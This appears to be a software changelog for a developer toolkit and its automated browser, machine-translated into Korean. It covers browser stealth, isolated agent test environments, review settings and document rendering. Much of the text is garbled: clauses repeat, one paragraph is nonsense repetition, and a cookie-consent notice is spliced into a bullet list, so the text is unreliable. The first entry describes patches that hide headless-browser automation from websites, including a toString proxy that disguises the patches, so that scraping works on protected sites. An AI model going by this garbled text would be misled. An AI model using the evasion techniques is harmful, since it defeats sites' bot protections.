GBrowser의 headless와 headed Chromium는 이제 no의 default에 의하여 "Layer C" 항검출을, 옵트인 깃발 발송합니다. default가 `navigator.webdriver`만 가면이 브라우저는 이제 `window.chrome.*` 모양 (런타임, 앱, csi, loadTimes)를 복원하고, 퍼미션 `Notification.permission`을 API로 정렬하고, 호스트 프로파일에서 `hardwareConcurrency`/`deviceMemory`를 제거하고, 알려진 Selenium/Phantom/Nightmare/Playwright 글로벌을 청소하고, `Function.prototype.toString` 프록시를 설치하여 각 패치를 다시 볼 수 있습니다. `[native code]`/>는 각 패치를 다시 볼 수 있습니다. `[native code]`는 각 패치를 다시 볼 수 있습니다. 공격적인 `GSTACK_STEALTH=extended` 모드 (WebGL spoof, 가짜 플러그인, mediaDevices)는 여전히 존재합니다, 지금 층 C의 정상에 그것을 대체하는 것보다 층으로 덮습니다. 그리고 훔치는 모든 4개의 컨텍스트creation 경로에 적용해, 그래서 `useragent` 변화, `viewport --scale`, 또는 머리없는-to-headed 손전등은 사이트 전체 마진 페이지를 매번 적용합니다.

### 중요 한 숫자

출처: `bun test browse/test/stealth-layer-c.test.ts browse/test/stealth-webdriver.test.ts browse/test/stealth-extended.test.ts browse/test/browser-manager-unit.test.ts` (80의 시험, 실시간 검사를 위한 진짜 Chromium).

| 기능 제품 | (v1.58.1.0) 이전 | (v1.58.3.0) 후 |
|---|---|---|
| 자동화는 default에 의해 masked를 말합니다 | 1 (navigator.webdriver) (으)로 | 7 카테고리 (웹 드라이버, window.chrome.*, 알림, 하드웨어 설치, toString-native, 자동화-글로벌 스위프트, cdc/Permissions) |
| 훔치는 경로를 설정 | 2 (런치, 발사본) | 4 (+ 핸프오프, + recreateContext) |
| toString 무결성 | not addressed | survives the depth-3 `[native code]` check |
| 하드웨어 ID | 일반 Chromium default | per-install, 호스트 프로파일에서 |
| 스텔스 테스트 | none 전용 | 80 통과 (실제로 크롬 런타임 포함) |

default 브라우저가 이제 7개의 카테고리의 자동화가 아닌 한가지를 말하며, 모든 경로에 페이지가 도달하지 못합니다.

### 이 빌더를 위한 뜻

GBrowser를 개식품, 스크랩, 또는 QA를 구동하면, 스크랩 보호 대상에 대한 세션은 실제 per-install Chrome와 같은 실제 모습으로 표시됩니다. no `GSTACK_STEALTH` 플래그가 기억하고 no 침묵 간격이 있는 `useragent` 또는 `viewport --scale`가 마스크를 벗깁니다. gbrowser는 팩 1 C++ 패치와 함께 빌드를 위해, set `GSTACK_*`는 `GSTACK_*` `GSTACK_*`의 `viewport --scale`가 붙지 않습니다. `GSTACK_*`는 `GSTACK_*`의 `GSTACK_*`가 붙지 않습니다.

### 항목화 된 변경

#### 추가
- 항상 레이어 C 훔치는 (`buildStealthScript`): 웹드라이버 마스크, `window.chrome.{runtime,app,csi,loadTimes}` 모양, `Notification.permission` 정렬, per-install `hardwareConcurrency`/`deviceMemory`, `Function.prototype.toString` 프록시는 깊이 3 `[native code]` 체크, Selenium/Phantom/Nightmare/Playwright 글로벌의 정적 스위퍼를 유지한다.
- `buildGStackLaunchArgs`: gbrowser의 팩 1 C++ 헝겊 조각을 위한 `--gstack-*`, UA-CH 플랫폼/model, 기계설비 concurrency/memory) 당 설치되는, gbrowser의 팩 1 C++ 헝겊 조각을 위한 `GSTACK_*` env가 이렇게 주식 Chromium가 비범성 놓일 때만 방출되는 `GSTACK_*`.
- Real-Chromium 런타임 적용: webdriver, chrome.* 모양, Notification/Permissions 페어링, toString Depth-3, per-install 하드웨어 및 확장 모드 블렌드(80 스텔스 테스트).

#### 변경
- 스텔스는 모든 컨텍스트-creation 경로 (`launch`, `launchHeaded`, `handoff`, `recreateContext`)에 적용되며, `useragent`, `viewport --scale`, 또는 handoff는 전체 마스크를 유지합니다.
- cdc_/`__webdriver` 정리 및 권한 알림은 `applyStealth`에서 라이브로, 그래서 headless와 handoff는 `Notification.permission`/`permissions.query` 일관성을 headed 경로로 얻습니다.
- `GSTACK_STEALTH=extended` 레이어 위에 레이어 C; 항상 default 가짜 `navigator.plugins` (선택 모드는 여전히, 문서화 된 "매우 휴식 사이트" 탈출 해치).
- `--gstack-suppress-prepare-stack-trace`는 `GSTACK_CDP_STEALTH=on`를 통해 선택하, 그래서 스위치는 그것을 이해하지 않는 Chromium를 결코 도달하지 않습니다.
- `--disable-blink-features=AutomationControlled`는 각 발사 경로의 1개의 공유 `STEALTH_LAUNCH_ARGS` 상수에서 옵니다.

## [1.58.1.0] - 2026-06-14

## **로컬 evals 중지 lying. spawn이드 `claude` 테스트 아이들은 밀봉 된 청정실에서 실행,** ## **그리고 지휘자에서 모든 결정은 당신이 편지에 대답하는 일반 텍스트 간략한입니다.**

두 가지가 여기에 배송. 먼저 로컬 E2E 하네스는 이제 default에 의해 신비한: 모든 spawn이드 에이전트 (클래드 -p, 진짜 -PTY 계획 모드 런너, 에이전트 SDK 주자, 플러스 코덱과 보석 런너) 수당 - 슬러브 환경을 얻을, 신선한 씨를 낸 `CLAUDE_CONFIG_DIR`, 온도 `GSTACK_HOME`, 그리고 `--strict-mcp-config`. 이 전에, dev 기계는 연산자의 `~/.claude` 구성, MCP 서버 (gbrain, 지휘자), 기술, `~/.gstack` 결정 로그 및 `CONDUCTOR_*`/`CLAUDECODE` env를 각 아이로 유출, 그래서 로컬 eval 결과 테스트 하에서 코드를 수행 하는 이유에 대 한 CI로 분해. 이제 로컬 신호 일치 CI. 설정 `EVALS_HERMETIC=0` 실제 상태에 대 한 디버깅.

두 번째, 지휘자 세션 gstack no 더 긴 전투 지휘자의 flaky AskUserQuestion 도구. 그것은 세션을 감지하고 모든 결정으로 번개 브리핑, 추천, 옵션 완전성 점수와 라벨이 된 질문, 그리고 "자신과 함께 되십시오," 도구와 prose에 리디렉션을 거부 PreToolUse HookUse에 의해 시행. 파괴적인 확인은 명시적 유형의 대답을 요구.

긴 eval 실행을 발사하는 에이전트은 `gstack-detach`를 얻습니다: SIGTERM-proof, idle-sleep-proof wrapper (fresh session + `caffeinate`)를 기계 넓은 자물쇠로 가진 이렇게 concurrent worktrees는 모형 API, 뛰기 뛰기 LOGs를 포용하는 대신에 일련을, 그리고 보장한 `EXIT=` sentinel 그래서 poller 결코 성공을 위한 침묵을 흠뻑 취합니다.

### 중요 한 숫자

연속적인 dev box(gbrain MCP up, live 지휘자 session, sibling worktrees)에 게이트 eval suite에 대해 측정합니다. Reproduce: `bun test` (무료 단위 + 배선 삼각대) 및 `EVALS=1 EVALS_TIER=gate bun test test/skill-e2e-hermetic-canary.test.ts`.

| Metric | 의 전 | 후지후 | Δ |
|--------|--------|-------|---|
| spawn이드 아이 env | 전체 연산자 `process.env` | 수의사 - scrubbed | —— 미스 |
| 런너스 hermeticized | 0 총 5 | 5 총 5 | +5 |
| 연산자 MCP 서버가 아이에 가해 | 모든 (gbrain, 지휘자) | 0 (`--strict-mcp-config`) | isolated |
| Config 고립 증거 | none | 독창성흡수기 sentinel canary | 옵션 정보 |
| 긴 eval은 턴바운드 SIGTERM를 surviving | no | yes (`gstack-detach`) | survives |

클린룸은 다음과 같이 겨루지 않는 한, 다음과 같습니다: `hermetic-sentinel` 게이트캐나다 식물 독소 연산자 설정 (사용자 `CLAUDE.md` + MCP 서버) 및 아이가 어떤 것을 볼 수 있는지 실패, 그리고 자유로운 정적 삼각대 실패 CI 어떤 주자 반전이 원시 `process.env` 퍼짐에.

### 기여자에 대한 의미

예를 들어, "P"는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고 불리는 "P"라고도합니다. "P"는 "P"라고도 함)을 의미하는 "P"라고도합니다. "P"라고도 함은 "P"라고도 함)는 "P"라고도합니다. `EVALS_HERMETIC=0`만 반복에서 실제 `~/.claude`를 deliberately 원할 때.

### 항목화 된 변경

#### 추가
- **신비한 E2E 환경** (`test/helpers/hermetic-env.ts`): allowlist env
  builder (process basics, network/proxy vars, named `ANTHROPIC_*` auth, per-runner `extraAllow`), pure `promotedEnv()` shared with `lib/conductor-env-shim.ts`, a sync-memoized singleton temp dir (`<runRoot>/.claude` keeps the plan-file path contract), a seeded `.claude.json` for non-interactive first run, and pid-aware GC of crashed runs. Default-on; `EVALS_HERMETIC=0` restores the legacy env AND drops `--strict-mcp-config`.
- **2개의 문 층 고립 canaries** (`test/skill-e2e-hermetic-canary.test.ts`):
  `hermetic-canary` asserts env redirect + 스크럽 + 0 MCP 서버 + 비소 API-key cost from Bash tool_result (모델 프로세스); `hermetic-sentinel`는 아이들이 심화 된 운영자 구성을 볼 수 없다는 것을 증명합니다.
- **정체되는 배선 삼각대** (`test/hermetic-wiring.test.ts`): 자유 계층 invariants
  즉, CI 5개의 주자 방울 `hermeticChildEnv()`, 문질 `--strict-mcp-config`, 또는 `process.env`를 호출 위치에 덮는 것을 통해 누출합니다.
- **`gstack-detach`** + `eval:bg` / `eval:bg:all` / `eval:bg:gate` / `eval:bg:periodic`
  스크립트: detached, SIGTERM-proof, `caffeinate`-wrapped eval은 기계 넓은 자물쇠, `~/.gstack-dev/eval-runs/`, watchdog, `EXIT=` sentinel의 밑에 per-run 로그와 함께 실행됩니다.
- **Conductor prose AskUserQuestion**: 지휘자 회의가 검출될 때, 각
  이 웹 사이트는 귀하가 웹 사이트를 탐색하는 동안 귀하의 경험을 향상시키기 위해 쿠키를 사용합니다. 이 쿠키들 중에서 필요에 따라 분류 된 쿠키는 웹 사이트의 기본적인 기능을 수행하는 데 필수적이므로 브라우저에 저장됩니다. 또한이 웹 사이트의 사용 방식을 분석하고 이해하는 데 도움이되는 제 3 자 쿠키를 사용합니다. 이 쿠키는 귀하의 동의하에 만 브라우저에 저장됩니다. 이러한 쿠키 중 일부를 선택 해제하면 검색 환경에 영향을 미칠 수 있습니다.

#### 변경
- 5개의 E2E 주자 (`session-runner`, `claude-pty-runner`, `agent-sdk-runner`,
  `codex-session-runner`, `gemini-session-runner`) `hermeticChildEnv()`를 통해 아이들을 스파게 하세요. 에이전트 SDK 주자 이제 COMPLETE 신비한 env를 `Options.env`(이전의 "never pass env: SDK" 규칙에 따라 부분적으로 교체되었습니다; 완전한 env는 안전합니다).
- `hermetic-env.ts`는 글로벌 터치파일이므로, E2E +를 선택하여 변경할 수 있습니다.
  심사시험
- CLAUDE.md 문서 신비한 - 기본 지역 evals 및 퇴직 stale SDK env
  경고.

#### 고정
- 작업 흐름 LLM-judge now re-appends body-carved `sections/*.md` after the marker
  슬라이스, 그래서 새겨진 기술 (document-release)는 반 문서 대신 에이전트가 실행되는 전체 워크플로에 판단됩니다.
- ios-qa daemon 시나리오는 `already_running` 충돌을 수정하는 고유의 pidfiles를 사용합니다
  `bun test --concurrent`에서.

## [1.58.0.0] - 2026-06-12

## **문서는 도표를 성장합니다. Mermaid와 excalidraw 담은 진짜 그림으로,** ## **그리고 make-pdf는 이제 단 하나 파일 HTML와 같은 마커다운에서 Word 출력을 발송합니다.**

` ```mermaid ` fence in your markdown and `make-pdf` renders it as a crisp vector diagram, fully offline, with the source preserved for round-trips. A broken fence prints a loud red diagnostic block with the parse error, never silent raw code. The new `/diagram` skill goes the other way: describe a flow in English and get a triplet back, the mermaid source, an editable `.excalidraw` 파일을 입력하면, 손으로 그려진 스타일에서 excalidraw.com에서 열 수 있으며, SVG + PNG를 렌더링합니다. 이미지는 동일한 관심을 가지고 있습니다. 로컬 경로는 자동으로 그리고 결코 truncate, 전화 사진 다운 스케일 파일 불이 켜지 않고, 넓은 작은 텍스트 다이어그램은 다른 초상화 문서 안쪽에 수직 중심의 풍경 페이지로 자체를 촉진합니다. 하나의 마크 다운 파일은 이제 세 가지 방법을 수출합니다. `--to pdf | html | docx`, 즉, 0 네트워크 참조와 하나의 자체 포함 파일입니다. 유형은 널 (12pt 몸, 56pt 덮개 제목), TOC 연결 실제로 점프, 및 `--strict`는, 먼, 밖으로 막대기, 또는 단단한 CI 실패로 대형 이미지의 맞은편에 더 큽니다.

### 중요 한 숫자

repo의 README (5,940 단어, 목록, 코드, 스크린 샷, 1개의 도표 담) 및 자유로운 문 스위트에 측정하는. Reproduce: `make-pdf generate README.md --cover --toc`와 `bun test make-pdf/test/`.

| Metric | 의 전 | 후지후 | Δ |
|--------|--------|-------|---|
| A mermaid fence in your PDF | 원료 블록 | 벡터 도표 | 의 특징 |
| 출력 형식의 한 마침 | 1 (pdf) | 3 (pdf, HTML, docx) | +2 |
| 네트워크 요청 at 렌더링 시간 | 1개까지 먼 이미지 | 0으로 default | —— 미스 |
| 다양한 가공 | 쇄석기로 | 의정부관광청 | 은폐 |
| 무료 화장-pdf 게이트 테스트 | 121 | 189 | +68 |
| README → 29 페이지 PDF | n/a | 4.4s의 | 1개의 명령 |

밀폐형 네트워크 번호는 통지가 될 것입니다. mermaid 및 excalidraw 런타임은 9.2MB의 면도된 번들로 공급되므로, 비행기에서 렌더링 작업과 과거의 마크다운 fetches에서 추적 픽셀이 아무것도 없습니다.

### 문서에 대한 의미는 무엇입니까?

영어를 설명하는 다이어그램은 영원히 편집 할 수 있습니다 : `/diagram`는 소스를 작성하고, 마크 다운의 소스를 포함하고, 모든 수출은 신선한 렌더링합니다. 그래프의 스크린 샷을 문서로 중지하십시오. 그림에 `/diagram`를 실행하십시오. ` ```mermaid ` for the document, and `---to html`를 판독기가 PDF를 원하지 않을 때.

### 항목화 된 변경

#### 추가
- ` ```mermaid ` and ` ```excalidraw ` 담은 인라인 벡터 SVG로 pdf에서 렌더링합니다
  그리고 HTML 출력 (docx는 300dpi PNG로 그(것)들을 포함). 담 선택권: `title="..."` (caption + aria-label), `render=false` (코드로 따르십시오), `page=landscape|portrait` (비행성 과량). Render 실패는 파스 오류를 가진 눈에 보이는 진단 구획을 일으킵니다.
- `/diagram` 기술: 영어, 편집 가능한 세겹 (`.mmd` 근원,
  `.excalidraw` 장면, SVG + PNG). Flowcharts는 완전히 편집 가능한 excalidraw 장면으로 개조합니다; 다른 mermaid 유형은 명시적인 한계로 렌더링합니다.
- `lib/diagram-render/`: 납품업자 오프라인 뭉치 (mermaid 11.12.2, excalidraw
  0.18.0의 정확한 핀), deterministic 구조, sha256 + 근원 지문, 편류 시험, THIRD-PARTY-LICENSES로 멈췄습니다.
- `--to pdf|html|docx` 출력 형식. HTML는 1개의 각자 포함합니다 (선행)
  SVG 다이어그램, 데이터-URI 이미지, 0 네트워크 refs, 스크린 읽기 가능). DOCX는 300dpi PNG 및 alt 텍스트로 내장 된 다이어그램과 콘텐츠의 신뢰성 수출입니다.
- per-image 지시어: `![x](a.png){width=full|50%|3in}` 과
  `{page=landscape|portrait}`.
- 보존 자동 조경 : 넓은, 작은 텍스트, 다이어그램 같은 이미지가 그들의
  자체 수직 중심의 풍경 페이지 (경도 ≥ 1.8, 폭 ~ 2.5x의 콘텐츠 상자, 다이어그램 -ish alt 단어). 방향 모두에서 override.
- `--strict` for CI: 이미지를 누락, 먼 이미지, out-of-tree 이미지는,
  과규격 파일 및 비규격 파일은 위주자에게 degrading 대신 실행되지 않습니다.
- `docs/howto-diagrams-and-formats.md`: 가득 차있는 연습, 체재에 담.

#### 변경
- 전기 가늠자: 12pt 몸, 26pt h1, 13pt 메타를 가진 56pt 포스터 덮개, 12pt
  TOC 항목, 더 큰 코드 및 테이블. 자동 hyphenation는 이렇게 사본 맛 수확량 청결한 낱말 떨어져 있습니다.
- 데이터 URI로 로컬 이미지 인라인으로 바이트 프로브 크기와 절대로
  truncate; 인라인 시간에 해결책을 인쇄하기 위하여 대형 사진 downscale; 반복된 이미지는 한 번 읽습니다.
- TOC 링크는 각 형식에서 해결합니다 (머리가 진짜 닻 ids를 얻습니다); 스크린
  레이어는 HTML 출력의 print-only page-number dots를 숨깁니다.
- 리모트 이미지는 `--allow-network`를 제외한 눈에 보이는 위주자로 차단됩니다
  밝기; out-of-tree 이미지 읽기 (symlink 포함) 크게 경고.
- `make-pdf preview` 문서가 담 또는 지방을 포함할 때 주의를 인쇄합니다
  `generate`만 하면 완전히 렌더링됩니다.

#### 고정
- 관계 이미지 경로는 PDF에서 올바르게 렌더링 (이전에 해결)
  잘못된 기초는 부서지는 상자로 보여줄 수 있었습니다).
- 내부 목록 내부 담은 렌더링 바이트 대 바이트를 생존; indented 울타리
  자신의 목록 배치를 유지.
- `$&`-style sequences in diagram labels are exactly;를 포함하는 문서
  Windows 드라이브-letter 이미지 경로는 로컬 파일로 해결; 실행 실패 대신 비공개 된 이미지 URL을 압축 해제.
- Per-side margins (`--margin-left` 등)는 문서에 포함될 수 있습니다.
  풍경 페이지.

#### 기여자
- 68 새로운 무료 계층 게이트 (Fence Extract, 이미지 정책, 풍경 프로모션
  부정적인 정착물, 체재 계약, 뭉치 편류로) 플러스 지불한 문 층 /diagram 삼중 시험 및 정기적인 허가 질 판결으로.
- make-pdf-gate CI는 이제 `lib/diagram-render/**`와 drift 시험을 커버합니다;
  묶음 상품은 LF 에 .gitattributes 으로 핀으로 꼿습니다.
- `operational-learning` E2E 정착물을 고쳤습니다 (빈은 지금 배로 씁니다
  lib 모듈을 가져 오기).

## [1.57.10.0] - 2026-06-10

## **Codex 리뷰는 default 에 의해 시작되었습니다.** ## **하나의 스위치가 그것을 지배하고 Claude Codex가 누락되거나 미끄러워지면 Claude로 돌아갑니다.**

Codex는 의도적으로 사용되는 크로스 모델 검토. `/review`와 `/ship`는 자동으로, 그러나 "외부 목소리를 걸었다?"문제를 통해 숨겨져있는 플랜 리뷰는 yes를 매번 말하고, `/document-release`는 전혀 전혀 ran, 모든 항목은 `codex` 이진 존재 여부를 확인, 로그인 여부. `codex_reviews`는 `/review`, `/ship`, `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`, `/document-release`, `/autoplan`를 통해 `/plan-devex-review`를 거짓는 1개의 주된 스위치 (default `enabled`)입니다. 외부 음성이 자동적으로 실행되는 계획 전망. `/document-release`는 당신의 docs에 대하여 실제로 발송한 것을 검사하는 새로운 Codex 통행을 얻습니다. 모든 호출 사이트는 이제 AND auth를 별도로 설치하고, Claude를 비틀게 건너 뛰는 대신 명확한 원라인 이유로 정렬합니다. 한 개의 명령으로 전체적인 일을 켭니다. `gstack-config set codex_reviews disabled`.

### 중요 한 숫자

이 정확한 경로 (`codex-offered-ceo-review`, `codex-offered-eng-review`, `document-release`, `codex-review-findings`)를 운동하는 게이트 계층 E2E evals에 의해 확인해, 이 모든 녹색이 이 뛰는.

| Metric | 의 전 | 후지후 | Δ |
|--------|--------|-------|---|
| Codex 리뷰가 default로 실행되는 스킬 | 2 | 8 | +6 |
| Prompts는 외부 목소리를 계획하는 | 1 (각 시간에서 선택) | 0 (자동) | -1 |
| Codex 읽음 검출 | 설치하기 | 설치 + auth | 퀵메뉴 |
| 모든 것을 비활성화하는 마스터 스위치 | 0 (당사) | 1 (`codex_reviews`) | +1 |
| `/document-release` Codex doc 감사 | none | doc-vs-diff 패스 | 의 새로운 |

Codex가 설치되었지만 로그인되지 않은 경우 `command -v codex`만 체크한 경로에 아무것도 얻지 못했습니다. 이제 Codex가 설치된 이름을 얻었지만 Claude 에이전트을 사용해서 인증되지 않았습니다. 스위치에 태토 (`gstack-config set codex_reviews disabledd`)가 거부되고 기존 설정이 보존되어 있으므로 지방 피임은 절대 침묵적으로 지불되지 않을 수 있습니다. Codex 통화 또는 꺼짐.

### 너를 위한 이 뜻

gstack 일에서 하루를 실행하면, 각 계획과 각 릴리스에 두 번째 모델의 눈을 얻는지 결정합니다. 그것은 단지 거기에 있습니다, default, 강력한 리뷰어가 이미 디프에 일한 방법. Codex 설정하지 않는 경우, 아무것도 휴식: 당신은 대신 Claude 외부 목소리를 얻을, 진정한 크로스 모델 적용을 위해 Codex를 추가하는 방법을 알려줍니다. 한 번에 한 번에 한 번에 한 번에 한 번에 한 번에 한 번에 한 번에 한 번에 한 번에 한 번에 한 번에 한 번의 클릭을 원하면.

### 항목화 된 변경

#### 추가
- **`codex_reviews` 마스터 스위치로** for Codex review across `/review`, `/ship`,
  `/document-release`, 4개의 플랜 리뷰, `/autoplan` (`bin/gstack-config`). Default `enabled`. `set`의 잘못된 값은 기존의 값 보존으로 거부되므로, 태풍은 Codex 호출을 플립할 수 없습니다.
- **`/document-release` Codex doc 감사** (`generateCodexDocReview`): 리뷰
  stale 주장에 대한 릴리스 diff에 대해 연락을 docs, undocumented new surface, over/under-sold CHANGELOG 항목. 정보, 명시적 인 적용 - 수정 결정점과. 자동 편집 docs.
- **`codexPreflight()` 공유 헬퍼** (`scripts/resolvers/constants.ts`): 1개
  스위치, 소스 probe, 체크 설치 및 auth를 읽는 각자에 의하여 달성된 bash 구획은, 단 하나 canonical 형태 (`ready`/`not_installed`/`not_authed`/`disabled`)를 방출합니다.

#### 변경
- **외부 음성을 계획하는 것은 기본적으로 온**, 옵트인. "외부를 유지
  음성?"문제가 사라진다; Codex가 사용할 수 없을 때 Claude subagent로 자동으로 실행되고 떨어졌다. 그 결과에 따라 여전히 명시된 승인이 필요한다 (크로스 모델 텐션은 제시되지 않습니다, 자동 승인되지 않음).
- **Adversarial 검토는 auth를 감지하고, 설치하지 않습니다** (`generateAdversarialStep`):
  "not Verified" 대 "not Verified" 지도를 구분합니다. 무거운 구조 `codex review`의 200 라인 임계 값은 변경되지 않습니다.
- **`/autoplan` `codex_reviews=disabled`를 수여합니다.** 단계 0.5 preflight에서, 그래서
  스위치는 정말 세계적인입니다.

#### 고정
- 3 `gstack-config` 테스트는 `get`/`list`를 출력합니다 unset 열쇠를 위해 빈을 덧붙였습니다;
  도구는 문서화 된 기본 테이블에 다시 떨어졌다. 현재 실제 행동과 일치합니다.

#### 기여자
- 크기 판결은 외부 청구서 prose에 대한 넓혀진, 각각을
  합법화 (`test/helpers/carve-guards.ts`, `test/helpers/parity-harness.ts`).
- Static guards 추가: 계획 리뷰는 선택된 질문을 수행하지 않고 렌더링해야합니다.
  기본 음성; `/document-release`는 doc 검토를 수행해야합니다; codex 호스트 스트립 모두 (`test/skill-validation.test.ts`).

## [1.57.9.0] - 2026-06-09

## **gstack 체크 아웃은 gbrain가 설치될 때 깨끗하게 유지됩니다.** ## **Brain-aware 기술 블록은 추적되지 않은 지점으로 렌더링되며, 추적되지 않은 소스에 결코 없습니다.**

Before this, finishing a Conductor or dev-workspace setup with gbrain installed rewrote 16 planning and review SKILL.md files in place, adding 326 lines of brain-aware blocks straight into tracked source. Your working tree came back dirty, one stray `git add` away from committing a token regression for everyone who does not run gbrain. Now `gen-skill-docs --out-dir` renders the brain-aware variant into an untracked per-workspace directory, and `bin/dev-setup` repoints the workspace's skill symlinks at it. dev workspace는 풀 gbrain 경험 (context-load 및 save-to-brain 블록은 실행 시간에 살고), 추적 된 SKILL.md 파일이 바이트 대역을 유지하면서. 모든 프로젝트의 Claude 세션에서 블록을 켜려면 `gstack-config gbrain-refresh` 이제 글로벌 설치로 렌더링되므로 symlinked 또는 non-gstack 디렉토리를 넘지 마십시오.

### 중요 한 숫자

diff plus `bun run gen:skill-docs` (zero drift)와 새로운 행동 테스트 (`test/gen-skill-docs-out-dir.test.ts`)에서 변경의 구조적 사실.

| gbrain가 설치되면 | 의 전 | 후지후 |
|---|---|---|
| dev-setup에 의해 손상된 SKILL.md 파일 추적 | 16 (+326 라인) | 0 |
| 뇌 인식 블록이 dev 작업 공간에서 렌더링되는 곳 | in-place, 트랙 소스 | `.claude/gstack-rendered/`, 추적 |
| 다른 프로젝트의 Brain-aware 블록 | 재 실행 `./setup` 또는 손 편집 | `gstack-config gbrain-refresh` (이중) |
| "나는 gbrain usable"확인 | per-caller JSON grep, stale 상태를 읽을 수 있습니다 | `gstack-gbrain-detect --is-ok` (한 번에 한 번) |

섹션 방향 리깅은 수술입니다 : `~/.claude/skills/gstack/<skill>/sections/` 참조는 렌더링 디디렉션으로 이동하므로 `bin/` 및 `docs/` 참조는 설치에 여전히 해결됩니다.

### 너를 위한 이 뜻

gbrain에 gstack를 개발하면 `git status`는 설정 후 다시 깨끗하고, 뇌 블록을 드리프트를 중지 할 수 있습니다. `git reset --hard` 설치의 배포 후, 다시 실행 `gstack-config gbrain-refresh` 기계 전체 블록을 복원하기 위해 (그것은 idempotent, 그리고 배포 노트에서 CLAUDE.md 이 아웃).

### 항목화 된 변경

#### 추가
- `gen-skill-docs --out-dir <dir>`: Claude SKILL.md + 섹션을 `gen-skill-docs --out-dir <dir>`를 렌더링합니다.
  대신 별도의 디렉토리, 섹션베이스 경로만 다시 작성하여 렌더링을 읽습니다. Default (no flag) 출력은 변경되지 않습니다.
- `gstack-gbrain-detect --is-ok`: 실시간 검출 출구 코드 문 (0 iff gbrain는 입니다
  usable), 그래서 설정, dev-setup, 그리고 gstack-config는 하나의 체크를 공유.
- `gstack-config gbrain-refresh` 이제 뇌 인식 블록을 글로벌으로 렌더링합니다.
  설치 (`~/.claude/skills/gstack`), symlinked 또는 비 Gstack 대상에 대 한 보호 및 `reset --hard` 재 실행 사이클에 대 한 자체 문서.

#### 변경
- `bin/dev-setup`는 `.claude/gstack-rendered`로 뇌 인식 변형을 렌더링합니다.
  (gitignored)와 재점 작업 공간 기술 symlinks에; worktree는 canonical 체재합니다. `GSTACK_SKIP_GBRAIN_REGEN`는 배열한 체제에 인라인을, 결코 수출하지 않습니다 통과했습니다.
- `setup` 명예 `GSTACK_SKIP_GBRAIN_REGEN` ( dev에 있는 장소에서 뇌 regen를 skips
  나무) 그리고 PID-unique tmp에 탐지 국가를 쓰고 그래서 동시 작업 공간은 clobber 그것 할 수 없습니다.
- `scripts/dev-skill.ts` 템플릿 변경에 workspace 렌더링을 새로 고침, 만
  렌더링 dir이 이미 존재할 때.
- `bin/dev-teardown`는 untracked 렌더링을 제거합니다.

#### 기여자
- 새로운 테스트: `test/gen-skill-docs-out-dir.test.ts` (현실: worktree는, 바꾸지 않는
  블록 렌더링, 섹션 경로 리 릿), `test/dev-setup-render-isolation.test.ts` 및 `test/gbrain-refresh-install-render.test.ts` (정전 삼각), 플러스 `--is-ok` 적용 범위 `test/gbrain-detect-shape.test.ts`.

## [1.57.8.0] - 2026-06-09

## **`browse`는 이제 상자에서 Chromium, 오프라인 렌더링을 위해.** ## **`js`/`eval --out <file>`는 디스크에 렌더링을 씁니다. 그래서 기술은 자신의 인형을 묶습니다.**

You can now turn your own local HTML or JSON into a PNG (or any bytes) on disk through the same headless `browse` Chromium you already run, with no second browser install. `js "<expr>" --out out.png` and `eval script.js --out out.png` write the evaluate result to a file instead of returning it. When the result is a base64 data URL (the shape Excalidraw exports, og-image generators, and card renderers hand back), `--out` decodes it to raw bytes for you; pass `--raw` to write the literal string. Malformed base64 오류는 손상된 파일을 작성 대신 크게 오류를 발생시키고 누락된 부모 디렉토리가 생성됩니다. 이 틈새는 로컬 렌더링 기술을 각 `npm i puppeteer`로 만들고 두 번째 크롬을 복사합니다.

### 중요 한 숫자

No 합성 벤치 마크 - 이것은 diff와 1 선 연기 (`browse load-html` → `screenshot --selector`/ `js --out`)에서 변화의 구조상 사실입니다.

| 로컬 HTML/JSON를 훔치는 기술 | 의 전 | 후지후 |
|---|---|---|
| Chromium는 상자 당 설치합니다 | 2+ (각 기술 자체 인형 + 각) | 1 (공유 `browse`) |
| 렌더링 함수에서 PNG 을 얻으세요. | `evaluate` → 멀티MB URL CLI 채널 → 핸드 디코드 base64 → 쓰기 | `js --out` 디코데 및 쓰기 서버 측; 단 상태는 수로를 교차합니다 |
| Render-to-file primitive의 장점 | none | `js`/`eval --out [--raw]` |

축복받은 오프라인 경로는 검색 기술에 문서화됩니다. 시각 출력은 `screenshot --selector` (사진은 CDP 철사를 교차하지 않습니다)를 통해 이동하고, 함수를 바이트로 돌려줍니다. `js --out`.

### 너를 위한 이 뜻

다이어그램, 카드, 또는 og-images를 그리는 기술을 쓰고 싶다면 `browse`에서 묶인 크롬을 삭제합니다. 핀에 1개의 버전, 관리하기 위하여 1개의 daemon. `--out`는 그것이 중요하에 쓰기로 대우됩니다: 그것은 `write` 범위가, 쌍 에이전트 터널에 막혀 있고, 시계 형태에서 문질러, 그래서 원격 에이전트는 당신의 디스크에 쓰기 위하여 그것을 결코 사용할 수 없습니다.

### 항목화 된 변경

#### 추가
- **`js` / `eval --out <file>` 렌더링 파일** (`browse/src/read-commands.ts`).
  디스크에 대한 평가 결과를 작성하고 짧은 `... result written: <path> (<N> bytes)` 상태를 반환합니다. `data:<type>;base64,...` 결과는 원시 바이트 (case-insensitive header parse, decode 전에 검증된 최초의 comma, base64-charset에 나타났습니다); `--raw`는 리터 글을 강제합니다. 부모 디렉토리가 작성됩니다.
- **`--raw` 플래그** to bypass data-URL 디코딩 및 리터럴 결과 문자열을 작성합니다.
- **Offline 렌더링 모드 docs** 검색 기술: 명시된 headless, no-proxy,
  일한 예로의 Xvfb 경로는 시각 (`screenshot --selector`) vs 바이트 (`js --out`), puppeteer→browse cheatsheet row, 그리고 "자신을 묶지 않는 것 Chromium" 참고 (CONTRIBUTING.md).

#### 변경
- **`--out`는 per-invocation WRITE 기능입니다** (`browse/src/server.ts`).
  `js`/`eval`는 명령을 읽을 수 있지만 `--out` invocation는 `write` 범위를 필요로 하고, 터널 표면 (`canDispatchOverTunnel`는 지금 args를 상담합니다)를 통해 결코 파견되지 않으며, 시계 형태 및 탭 네거티브 문을 위한 돌연변이로 조사합니다.

#### 기여자
- 새로운 시험: `parseOutArgs`/`hasOutArg` 단위 적용 (`--out`/`--out=`, `--raw`,
